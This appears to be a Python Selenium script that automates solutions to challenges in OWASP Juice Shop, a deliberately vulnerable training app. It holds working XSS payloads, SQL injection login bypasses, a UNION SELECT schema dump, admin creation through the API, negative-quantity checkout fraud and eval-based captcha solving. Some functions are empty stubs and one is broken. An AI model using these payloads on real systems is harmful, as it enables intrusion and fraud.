from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium_utils import open_url, wait_for_element_to_be_visible_by_css_selector, open_homepage_and_wait_for_juiceshop_logo, wait_for_element_to_be_clickable_and_click_by_css_selector, wait_for_element_to_be_clickable_by_css_selector, write_text_and_press_enter, write_text, refresh_url, parsing_currentpage
from selenium.webdriver.common.alert import Alert
from random import choice, randint
from utils import generate_random_email, get_admin_session, send_feedback, whoami, get_current_user_id, build_basket, add_basket, checkout
from time import sleep
from os import path, remove
from re import match, sub
from selenium.webdriver import ActionChains
from requests import post, Session, get
from json import dumps

def scoreboard(driver, wait, url_address):
    open_url(driver, f'{url_address}/#/score-board')
    wait_for_element_to_be_visible_by_css_selector(wait, '.logo')
 
def dom_xss(driver, wait, url_address):
    open_homepage_and_wait_for_juiceshop_logo(driver, url_address, wait)
    wait_for_element_to_be_clickable_and_click_by_css_selector(wait, 'mat-icon.mat-ripple:nth-child(2)')
    sleep(1)
    wait_for_element_to_be_clickable_by_css_selector(wait, '#mat-input-0')
    sleep(1)
    write_text_and_press_enter(driver, '#mat-input-0', '<iframe src="javascript:alert(`xss`)">')
    sleep(1)
    wait.until(EC.alert_is_present())
    sleep(1)
    driver.switch_to.alert.accept()
    sleep(1)
    wait_for_element_to_be_visible_by_css_selector(wait, '.logo')
    sleep(1)
 
def bonus_payload(driver, wait, url_address):
    open_homepage_and_wait_for_juiceshop_logo(driver, url_address, wait)
    wait_for_element_to_be_clickable_and_click_by_css_selector(wait, 'mat-icon.mat-ripple:nth-child(2)')
    wait_for_element_to_be_clickable_by_css_selector(wait, '#mat-input-0')
    write_text_and_press_enter(driver, '#mat-input-0', '<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>')
    wait_for_element_to_be_visible_by_css_selector(wait, '.mat-card-title > span:nth-child(1)')

def confidential_document(driver, wait, url_address):
    open_url(driver, f'{url_address}/ftp')
    wait_for_element_to_be_visible_by_css_selector(wait, '#wrapper > h1:nth-child(1) > a:nth-child(2)')
 
def error_handling(driver, wait, url_address):
    open_url(driver, f'{url_address}/rest/qwertz')
    wait_for_element_to_be_visible_by_css_selector(wait, '#wrapper > h1:nth-child(1)') 
 
def exposed_metrics(driver, wait, url_address):
    open_url(driver, f'{url_address}/metrics')
    wait_for_element_to_be_visible_by_css_selector(wait, 'body > pre:nth-child(1)')
 
def missing_encoding(driver, wait, url_address):
    open_url(driver, f'{url_address}/assets/public/images/uploads/%F0%9F%98%BC-%23zatschi-%23whoneedsfourlegs-1572600969477.jpg')
    wait_for_element_to_be_visible_by_css_selector(wait, 'body > img:nth-child(1)')
 
def outdated_allowlist(driver, wait, url_address):
    open_url(driver, f'{url_address}/redirect?to=https://blockchain.info/address/1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm')
    wait_for_element_to_be_visible_by_css_selector(wait, '.sc-36b3c2e6-9 > div:nth-child(1)')
 
def privacy_policy(driver, wait, url_address):
    open_url(driver, f'{url_address}/#/privacy-security/privacy-policy')
    wait_for_element_to_be_visible_by_css_selector(wait, '.privacy-policy > h1:nth-child(1)')
 
def repetitive_registration(driver, wait, url_address):
    open_url(driver, f'{url_address}/#/register')
    wait_for_element_to_be_visible_by_css_selector(wait, '.logo')

    random_email = generate_random_email()

    wait_for_element_to_be_clickable_and_click_by_css_selector(wait, '#emailControl')
    write_text(driver, '#emailControl', random_email)

    wait_for_element_to_be_clickable_and_click_by_css_selector(wait, '.mat-select-arrow')
    wait_for_element_to_be_clickable_and_click_by_css_selector(wait, '#mat-option-0 > span:nth-child(1)')
    
    wait_for_element_to_be_clickable_and_click_by_css_selector(wait, '#securityAnswerControl')
    write_text(driver, '#securityAnswerControl', random_email)
    
    wait_for_element_to_be_clickable_and_click_by_css_selector(wait, '#passwordControl')
    write_text(driver, '#passwordControl', '12345')

    wait_for_element_to_be_clickable_and_click_by_css_selector(wait, '#repeatPasswordControl')
    write_text(driver, '#repeatPasswordControl', '12345')

    wait_for_element_to_be_clickable_and_click_by_css_selector(wait, '#passwordControl')
    write_text(driver, '#passwordControl', '54321')

    wait_for_element_to_be_clickable_and_click_by_css_selector(wait, '#registerButton > span:nth-child(1)')

    wait_for_element_to_be_visible_by_css_selector(wait, '.logo')
 
def login_admin(driver, wait, url_address):
    open_url(driver, f'{url_address}/#/login')
    wait_for_element_to_be_visible_by_css_selector(wait, '.logo')

    wait_for_element_to_be_clickable_and_click_by_css_selector(wait, '#email')
    write_text(driver, '#email', "' or 1=1--")

    wait_for_element_to_be_clickable_and_click_by_css_selector(wait, '#password')
    write_text(driver, '#password', 'password')

    wait_for_element_to_be_clickable_and_click_by_css_selector(wait, '.mat-checkbox-inner-container')
    wait_for_element_to_be_clickable_and_click_by_css_selector(wait, '#loginButton > span:nth-child(1)')

    wait_for_element_to_be_visible_by_css_selector(wait, '.logo')
 
def admin_section(driver, wait, url_address):
    open_url(driver, f'{url_address}/#/administration')
    wait_for_element_to_be_visible_by_css_selector(wait, '.logo')
 
def log_off(driver, wait, url_address):
    open_homepage_and_wait_for_juiceshop_logo(driver, url_address, wait)
    
    wait_for_element_to_be_clickable_and_click_by_css_selector(wait, '#navbarAccount > span:nth-child(1) > span:nth-child(2)')
    wait_for_element_to_be_clickable_and_click_by_css_selector(wait, '#navbarLogoutButton > span:nth-child(2)')
 
def login_mc_safesearch(driver, wait, url_address):
    open_url(driver, f'{url_address}/#/login')
    wait_for_element_to_be_visible_by_css_selector(wait, '.logo')

    wait_for_element_to_be_clickable_and_click_by_css_selector(wait, '#email')
    write_text(driver, '#email', "mc.safesearch@juice-sh.op")

    wait_for_element_to_be_clickable_and_click_by_css_selector(wait, '#password')
    write_text(driver, '#password', 'Mr. N00dles')

    wait_for_element_to_be_clickable_and_click_by_css_selector(wait, '#loginButton > span:nth-child(1)')
    
    wait_for_element_to_be_visible_by_css_selector(wait, '.logo')
 
def password_strength(driver, wait, url_address):
    open_url(driver, f'{url_address}/#/login')
    wait_for_element_to_be_visible_by_css_selector(wait, '.logo')

    wait_for_element_to_be_clickable_and_click_by_css_selector(wait, '#email')
    write_text(driver, '#email', "admin@juice-sh.op")

    wait_for_element_to_be_clickable_and_click_by_css_selector(wait, '#password')
    write_text(driver, '#password', 'admin123')

    wait_for_element_to_be_clickable_and_click_by_css_selector(wait, '#loginButton > span:nth-child(1)')

    wait_for_element_to_be_visible_by_css_selector(wait, '.logo')
 
def bully_chatbot(driver, wait, url_address):
    messages = (
    "Can I have a coupon code?",
    "Please give me a discount!",
    "Could you give me a discount?",
    "Are there any current offers or promotions?",
    "Can you provide me with a promotional code?",
    "Is there a discount available?",
    "What other discounts do you have?",
    "Are there any limited-time offers?",
    "Can I get a special promotion?",
    "Can I have a voucher code?"
    )
 
    open_url(driver, f'{url_address}/#/chatbot')
    wait_for_element_to_be_visible_by_css_selector(wait, '.logo')
 
    wait_for_element_to_be_visible_by_css_selector(wait, '.speech-bubble-left')
 
    while True:
        response_elements = driver.find_elements(By.CSS_SELECTOR, ".speech-bubble-left")

        for element in response_elements:
            outer_html = element.get_attribute("outerHTML")
            if "10%" in outer_html:
                return
 
        random_message = choice(messages)
        wait_for_element_to_be_clickable_and_click_by_css_selector(wait, '#message-input')
        message_element = driver.find_element(By.CSS_SELECTOR, "#message-input")
        message_element.clear()

        last_response = response_elements[-1].get_attribute("outerHTML")

        if "10%" not in last_response:
            message_element.send_keys(random_message)
            message_element.send_keys(Keys.ENTER)

def zero_stars(url_address):
    return

def forged_feedback(url_address):
    session = get_admin_session(url_address)
    payload = {'comment': 'forged', 'UserId': 2}
    send_feedback(url_address, session, payload)

def view_basket(driver, wait, url_address):
    open_url(driver, f'{url_address}/#/search')
    wait_for_element_to_be_visible_by_css_selector(wait, '.logo')

    wait_for_element_to_be_clickable_and_click_by_css_selector(wait, 'mat-grid-tile.mat-grid-tile:nth-child(1) > div:nth-child(1) > mat-card:nth-child(1) > div:nth-child(2) > button:nth-child(1) > span:nth-child(1) > span:nth-child(1)')
    sleep(1)
    wait_for_element_to_be_clickable_and_click_by_css_selector(wait, 'mat-grid-tile.mat-grid-tile:nth-child(2) > div:nth-child(1) > mat-card:nth-child(1) > div:nth-child(2) > button:nth-child(1) > span:nth-child(1) > span:nth-child(1)')
    sleep(1)
    wait_for_element_to_be_clickable_and_click_by_css_selector(wait, 'mat-grid-tile.mat-grid-tile:nth-child(3) > div:nth-child(1) > mat-card:nth-child(1) > div:nth-child(2) > button:nth-child(1) > span:nth-child(1) > span:nth-child(1)')

    bid = driver.execute_script("return sessionStorage.getItem('bid');")
    new_bid = str(int(bid) + 1)
    driver.execute_script(f"sessionStorage.setItem('bid', '{new_bid}');")
    sleep(1)

    open_url(driver, f'{url_address}/#/basket')
    wait_for_element_to_be_visible_by_css_selector(wait, '.logo')
    refresh_url(driver)
    wait_for_element_to_be_visible_by_css_selector(wait, '.logo')
    sleep(1)

def deprecated_interface(driver, wait, url_address):
    open_url(driver, f'{url_address}/#/complain')
    wait_for_element_to_be_visible_by_css_selector(wait, '.logo')

    wait_for_element_to_be_clickable_and_click_by_css_selector(wait, '#complaintMessage')
    write_text(driver, '#complaintMessage', 'Hello, friend.')
    
    random_content = f"<root><element>{randint(1,100)}</element></root>"
    with open("temp.xml", "w") as file:
        file.write(random_content)

    absolute_file_path = path.abspath("temp.xml")
    driver.find_element(By.CSS_SELECTOR, "#file").send_keys(absolute_file_path)
    sleep(1)

    wait_for_element_to_be_clickable_and_click_by_css_selector(wait, '#submitButton > span:nth-child(1) > i:nth-child(1)')
    wait_for_element_to_be_visible_by_css_selector(wait, '.logo')

    remove("temp.xml")

def easter_egg(driver, wait, url_address):
    return

def security_policy(driver, wait, url_address):
    open_url(driver, f'{url_address}/.well-known/security.txt')
    wait_for_element_to_be_visible_by_css_selector(wait, 'body > pre:nth-child(1)')

def vulnerable_library(driver, wait, url_address):
    open_url(driver, f'{url_address}/#/contact')
    wait_for_element_to_be_clickable_and_click_by_css_selector(wait, '#comment')
    write_text(driver, '#comment', 'z85 base85 base64 md5 hashid')

    offset_x = 50
    offset_y = 0

    wait_for_element_to_be_clickable_and_click_by_css_selector(wait, '.mat-slider-thumb')

    wait_for_element_to_be_visible_by_css_selector(wait, ".mat-slider-thumb-label")
    slider = driver.find_element(By.CSS_SELECTOR, ".mat-slider-thumb-label")
    actions = ActionChains(driver)
    actions.click_and_hold(slider).move_by_offset(offset_x, offset_y).release().perform()
    
    captcha_element = driver.find_element(By.CSS_SELECTOR, "#captcha")
    captcha_text = captcha_element.text
    captcha_text = captcha_text.replace('x', '*')

    captcha_result = eval(captcha_text)
    captcha_control_element = driver.find_element(By.CSS_SELECTOR, "#captchaControl")
    captcha_control_element.clear()
    captcha_control_element.send_keys(str(captcha_result))

    if match(r'^[\d+\-*\/\s]+$', captcha_text):
        captcha_result = eval(captcha_text)
        captcha_control_element = driver.find_element(By.CSS_SELECTOR, "#captchaControl")
        captcha_control_element.clear()
        captcha_control_element.send_keys(str(captcha_result))
        wait_for_element_to_be_clickable_and_click_by_css_selector(wait, '#submitButton > span:nth-child(1)')
    else:
        raise ValueError("Invalid characters in captcha.")
    
def reflected_xss(driver, wait, url_address):
    open_url(driver, f'{url_address}/#/order-history')
    wait_for_element_to_be_visible_by_css_selector(wait, '.logo')
    wait_for_element_to_be_clickable_and_click_by_css_selector(wait, '.mat-card-cvr > div:nth-child(2) > div:nth-child(1) > div:nth-child(1) > div:nth-child(1) > div:nth-child(1) > div:nth-child(5) > button:nth-child(1) > span:nth-child(1) > mat-icon:nth-child(1)')

    current_url = driver.current_url
    new_url = sub(r'id=[^&]*', 'id=<iframe src="javascript:alert(`xss`)">', current_url)
    driver.get(new_url)
    sleep(1)
    driver.refresh()
    sleep(1)
    wait.until(EC.alert_is_present())
    sleep(1)
    driver.switch_to.alert.accept()
    sleep(1)
    wait_for_element_to_be_visible_by_css_selector(wait, '.logo')

def meta_geo_stalking(driver, wait, url_address):
    open_url(driver, f'{url_address}/#/forgot-password')
    wait_for_element_to_be_visible_by_css_selector(wait, '.logo')

    wait_for_element_to_be_clickable_and_click_by_css_selector(wait, '#email')
    write_text(driver, '#email', 'john@juice-sh.op')

    wait_for_element_to_be_clickable_and_click_by_css_selector(wait, '#securityAnswer')
    write_text(driver, '#securityAnswer', 'Daniel Boone National Forest')

    wait_for_element_to_be_clickable_and_click_by_css_selector(wait, '#newPassword')
    write_text(driver, '#newPassword', 'john123')

    wait_for_element_to_be_clickable_and_click_by_css_selector(wait, '#newPasswordRepeat')
    write_text(driver, '#newPasswordRepeat', 'john123')

    wait_for_element_to_be_clickable_and_click_by_css_selector(wait, '#resetButton > span:nth-child(1)')

def visual_geo_stalking(driver, wait, url_address):
    open_url(driver, f'{url_address}/#/forgot-password')
    wait_for_element_to_be_visible_by_css_selector(wait, '.logo')

    wait_for_element_to_be_clickable_and_click_by_css_selector(wait, '#email')
    write_text(driver, '#email', 'emma@juice-sh.op')

    wait_for_element_to_be_clickable_and_click_by_css_selector(wait, '#securityAnswer')
    write_text(driver, '#securityAnswer', 'ITsec')

    wait_for_element_to_be_clickable_and_click_by_css_selector(wait, '#newPassword')
    write_text(driver, '#newPassword', 'emma123')

    wait_for_element_to_be_clickable_and_click_by_css_selector(wait, '#newPasswordRepeat')
    write_text(driver, '#newPasswordRepeat', 'emma123')

    wait_for_element_to_be_clickable_and_click_by_css_selector(wait, '#resetButton > span:nth-child(1)')

def admin_registration(driver, wait, url_address, email, password, role):
    open_homepage_and_wait_for_juiceshop_logo(driver, url_address, wait)

    url = f"{url_address}/api/Users"

    data = {
        "email": email,
        "password": password,
        "role": role
    }

    headers = {
        'Content-Type': 'application/json'
    }

    try:
        response = post(url, data=dumps(data), headers=headers)

        if response.status_code == 200 or response.status_code == 201:
            pass
        else:
            raise ValueError(f"Failed to create admin user: {response.content}")
    except Exception as e:
        raise ValueError(f"An error occurred: {str(e)}")

def manipulate_basket():
    return

def captcha_bypass(driver, wait, url_address):
    open_url(driver, f'{url_address}/#/contact')
    
    messages = (
    "Become who you are.",
    "I want to break free...",
    "Live dangerously.",
    "CHOCOLATE.",
    "What does not kill me makes me stronger.",
    "Wubba lubba dub dub!",
    "All things are subject to interpretation.",
    "Get Schwifty.",
    "You may say I'm a dreamer...",
    "It's just Rick-diculous.",
    "Imagination rules the world.",
    "Ability is nothing without opportunity.",
    "In politics stupidity is not a handicap.",
    "We're freer the better we are.",
    "Maybe that wasn't your question, but it's my answer!"
    )

    offset_x = 25
    offset_y = 0

    for _ in range(10):
        random_message = choice(messages)

        wait_for_element_to_be_clickable_and_click_by_css_selector(wait, '#comment')
        write_text(driver, '#comment', random_message)

        #wait_for_element_to_be_clickable_and_click_by_css_selector(wait, '.mat-slider-thumb')
        wait_for_element_to_be_visible_by_css_selector(wait, ".mat-slider-thumb-label")

        slider = driver.find_element(By.CSS_SELECTOR, ".mat-slider-thumb-label")
        actions = ActionChains(driver)
        actions.click_and_hold(slider).move_by_offset(offset_x, offset_y).release().perform()
        
        captcha_element = driver.find_element(By.CSS_SELECTOR, "#captcha")
        captcha_text = captcha_element.text
        captcha_text = captcha_text.replace('x', '*')

        captcha_result = eval(captcha_text)
        captcha_control_element = driver.find_element(By.CSS_SELECTOR, "#captchaControl")
        captcha_control_element.clear()
        captcha_control_element.send_keys(str(captcha_result))

        if match(r'^[\d+\-*\/\s]+$', captcha_text):
            captcha_result = eval(captcha_text)
            captcha_control_element = driver.find_element(By.CSS_SELECTOR, "#captchaControl")
            captcha_control_element.clear()
            captcha_control_element.send_keys(str(captcha_result))
            wait_for_element_to_be_clickable_by_css_selector(wait, '#submitButton > span:nth-child(1)')
            captcha_control_element.send_keys(Keys.ENTER)
            # wait_for_element_to_be_clickable_and_click_by_css_selector(wait, '#submitButton > span:nth-child(1)')
        else:
            raise ValueError("Invalid characters in captcha.") 

        sleep(0.1)

def csrf(url_address):
    return

def database_schema(driver, wait, url_address):
    open_homepage_and_wait_for_juiceshop_logo(driver, url_address, wait)

    payload = "')) UNION SELECT {columns} FROM sqlite_master--"

    num_columns = 1

    while True:
        columns = ', '.join(f"'{i}'" for i in range(1, num_columns + 1))
        params = {'q': payload.format(columns=columns)}
        response = get(f'{url_address}/rest/products/search', params=params)

        if response.status_code == 200:
            break

        num_columns += 1

    params = {'q': "qwert" + payload.format(columns=columns)}
    response = get(f'{url_address}/rest/products/search', params=params)

    params = {'q': "qwert')) UNION SELECT sql, " + ', '.join(f"'{i}'" for i in range(2, num_columns + 1)) + " FROM sqlite_master--"}
    response = get(f'{url_address}/rest/products/search', params=params)

    return dumps(response.json())

def deluxe_fraud(url_address):
    return

def forged_review(url_address):
    return

def gdrp_data_erasure(driver, wait, url_address):
    open_url(driver, f'{url_address}/#/login')
    wait_for_element_to_be_visible_by_css_selector(wait, '.logo')

    wait_for_element_to_be_clickable_and_click_by_css_selector(wait, '#email')
    write_text(driver, '#email', "\' or deletedAt IS NOT NULL--")

    wait_for_element_to_be_clickable_and_click_by_css_selector(wait, '#password')
    write_text(driver, '#password', 'password')

    wait_for_element_to_be_clickable_and_click_by_css_selector(wait, '#loginButton > span:nth-child(1)')

    wait_for_element_to_be_visible_by_css_selector(wait, '.logo')

def login_amy(driver, wait, url_address):
    open_url(driver, f'{url_address}/#/login')
    wait_for_element_to_be_visible_by_css_selector(wait, '.logo')

    wait_for_element_to_be_clickable_and_click_by_css_selector(wait, '#email')
    write_text(driver, '#email', "amy@juice-sh.op")

    wait_for_element_to_be_clickable_and_click_by_css_selector(wait, '#password')
    write_text(driver, '#password', 'K1f.....................')

    wait_for_element_to_be_clickable_and_click_by_css_selector(wait, '#loginButton > span:nth-child(1)')

    wait_for_element_to_be_visible_by_css_selector(wait, '.logo')

def login_bender(driver, wait, url_address):
    open_url(driver, f'{url_address}/#/login')
    wait_for_element_to_be_visible_by_css_selector(wait, '.logo')

    wait_for_element_to_be_clickable_and_click_by_css_selector(wait, '#email')
    write_text(driver, '#email', "bender@juice-sh.op'--")

    wait_for_element_to_be_clickable_and_click_by_css_selector(wait, '#password')
    write_text(driver, '#password', 'password')

    wait_for_element_to_be_clickable_and_click_by_css_selector(wait, '#loginButton > span:nth-child(1)')

    wait_for_element_to_be_visible_by_css_selector(wait, '.logo')

def login_jim(driver, wait, url_address):
    open_url(driver, f'{url_address}/#/login')
    wait_for_element_to_be_visible_by_css_selector(wait, '.logo')

    wait_for_element_to_be_clickable_and_click_by_css_selector(wait, '#email')
    write_text(driver, '#email', "jim@juice-sh.op'--")

    wait_for_element_to_be_clickable_and_click_by_css_selector(wait, '#password')
    write_text(driver, '#password', 'password')

    wait_for_element_to_be_clickable_and_click_by_css_selector(wait, '#loginButton > span:nth-child(1)')

    wait_for_element_to_be_visible_by_css_selector(wait, '.logo')

def reset_benders_password(driver, wait, url_address):
    open_url(driver, f'{url_address}/#/forgot-password')
    wait_for_element_to_be_visible_by_css_selector(wait, '.logo')

    wait_for_element_to_be_clickable_and_click_by_css_selector(wait, '#email')
    write_text(driver, '#email', 'bender@juice-sh.op')

    wait_for_element_to_be_clickable_and_click_by_css_selector(wait, '#securityAnswer')
    write_text(driver, '#securityAnswer', "Stop'n'Drop")

    wait_for_element_to_be_clickable_and_click_by_css_selector(wait, '#newPassword')
    write_text(driver, '#newPassword', 'bender123')

    wait_for_element_to_be_clickable_and_click_by_css_selector(wait, '#newPasswordRepeat')
    write_text(driver, '#newPasswordRepeat', 'bender123')

    wait_for_element_to_be_clickable_and_click_by_css_selector(wait, '#resetButton > span:nth-child(1)')

def payback_time(url_address):
    session = get_admin_session(url_address)
    basketid = get_current_user_id(url_address, session)
    payload = build_basket(12, basketid, -999)
    add_basket(url_address, session, payload)
    checkout(url_address, session, basketid)

def privacy_policy_inspection(url_address):
    open_url(driver, f'{url_address}/we/may/also/instruct/you/to/refuse/all/reasonably/necessary/responsibility')
    wait_for_element_to_be_visible_by_css_selector(wait, '#wrapper > h1:nth-child(1)')
